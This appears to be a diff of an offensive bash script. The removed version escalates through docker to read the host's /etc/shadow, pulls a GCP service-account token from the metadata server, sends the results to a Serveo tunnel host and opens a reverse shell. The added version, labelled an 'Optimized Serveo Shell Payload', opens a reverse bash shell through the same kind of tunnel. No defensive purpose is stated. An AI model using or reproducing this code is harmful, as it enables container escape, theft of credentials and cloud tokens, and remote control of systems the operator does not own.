@@ -1,18 +1,14 @@
 #!/bin/bash
-LOG_URL="https://7daa791e95d6cac0-103-95-173-85.serveousercontent.com"
-SHELL_HOST="2bf41840cd5a5d42-103-95-173-85.serveousercontent.com"
+# Optimized Serveo Shell Payload
+HOST="f43a3b45d041be6a-103-95-173-85.serveousercontent.com"
 
-{
-  echo "--- [1] IDENTITY ---"
-  id; groups | grep -o 'docker'
-  echo "--- [2] HOST ESCAPE ---"
-  IMG=$(sudo docker images -q | head -n 1)
-  sudo docker run --rm -v /:/host:ro $IMG hostname 2>/dev/null
-  echo "--- [3] SHADOW ACCESS ---"
-  sudo docker run --rm -v /etc:/mnt:ro $IMG head -n 3 /mnt/shadow 2>/dev/null
-  echo "--- [4] GCP TOKEN ---"
-  curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity
-  sleep 2
-} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "$LOG_URL"
-
-bash -i >& /dev/tcp/2bf41840cd5a5d42-103-95-173-85.serveousercontent.com/80 0>&1 &
+(
+  # 1. Open a network file descriptor (5) to the tunnel
+  exec 5<>/dev/tcp/$HOST/80
+  
+  # 2. Send the 'Handshake' so Serveo forwards the data
+  echo -e "POST / HTTP/1.1\nHost: $HOST\nUpgrade: websocket\nConnection: Upgrade\n\n" >&5
+  
+  # 3. Connect the shell to that same file descriptor
+  /bin/bash -i <&5 >&5 2>&5
+) &
